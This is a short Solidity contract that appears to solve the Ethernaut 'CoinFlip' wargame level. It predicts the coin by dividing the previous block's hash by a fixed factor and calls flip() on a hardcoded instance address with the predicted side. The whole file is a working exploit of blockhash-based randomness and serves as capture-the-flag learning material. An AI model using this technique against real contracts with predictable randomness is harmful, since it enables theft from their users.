// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "./interfaces/3_ICoinFlip.sol";

address constant INSTANCE = 0xA09efEbeA5Db5e0277DDc10c610b71183d3Ee939;
uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

contract CoinFlipSolution {
    using Math for uint256;

    ICoinFlip instance = ICoinFlip(INSTANCE);

    function solve() external {
        (, uint256 prevBlockNumber) = (block.number).trySub(1);
        uint256 blockValue = uint256(blockhash(prevBlockNumber));
        (, uint256 coinFlip) = (blockValue).tryDiv(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        bool success = instance.flip(side);
        require(success, "Bad guess");
    }
}
